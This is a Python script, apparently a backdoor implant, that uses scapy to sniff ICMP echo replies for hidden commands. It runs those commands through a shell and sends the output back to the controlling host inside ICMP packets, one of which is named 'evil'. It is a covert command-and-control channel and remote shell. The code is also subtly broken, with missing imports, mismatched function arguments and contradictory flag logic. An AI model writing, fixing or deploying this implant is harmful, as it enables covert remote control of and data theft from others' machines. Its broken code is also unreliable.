from scapy.all import *
from scapy.all import IP,ICMP
from subprocess import Popen, PIPE

def send_over_icmp(server, response, SSM, execute):
    if SSM and not execute: header = "###$0"
    elif SSM and execute: header = "###$1"
    elif execute and not SSM: header = "###01"
    elif not execute and not SSM: header = "###00" 
    serverresponse = header + response
    evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
    send(evil)

def execute_command(server, command):
    execute = True
    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
    output, error = p.communicate()
    send_over_icmp(server, str(output))

def reply(src, command):
    execute = False
    if command == "PING":
            send_over_icmp(src, "PONG")
    else:
        send_over_icmp(src, "ACKNOWLEDGED")

def handle(pkt):
    SSM = True
    src = pkt[IP].dst
    payload = str(pkt.payload)
    parsed = re.split('!{3}', payload)
    if len(parsed) == 1:
        return
    else: 
        command = parsed[1][:-1]
        if command[0] == "0" and command[1] == "0":
            SSM = False
            execute = False
        elif command[0] == "$" and command[1] == "0":
            SSM = True
            execute = False
        elif command[0] != "$" and command[1] == "1":
            SSM = True
            execute = False
        elif command[0] != "0" and command[1] == "1":
            SSM = False
            execute = True
        else:
            print("Error?")

        command = command[2:]
        if execute:
            execute_command(src, command)
        else:
            reply(src, command)
    
        

sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
